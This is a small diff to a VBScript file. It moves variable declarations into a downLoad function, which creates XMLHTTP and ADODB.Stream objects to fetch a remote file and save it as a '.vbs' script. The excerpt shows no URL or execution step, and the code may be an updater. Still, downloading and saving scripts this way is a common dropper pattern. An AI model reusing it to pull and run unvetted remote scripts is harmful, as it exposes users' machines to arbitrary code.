@@ -1,4 +1,3 @@
-Dim strCurDir, xHttp, bStrm, appVersion, fileName
 function checkProcess(process)
 	Dim i, strComputer, FindProc
 	strComputer = "."
@@ -35,6 +34,7 @@ function checkUrl(chkurl)
 end function
 	
 function downLoad(dldurl)
+	Dim strCurDir, xHttp, bStrm, appVersion, fileName
 	fileName = "\" & appVersion & ".vbs"
 	Set xHttp = createobject("Microsoft.XMLHTTP")
 	Set bStrm = createobject("Adodb.Stream")
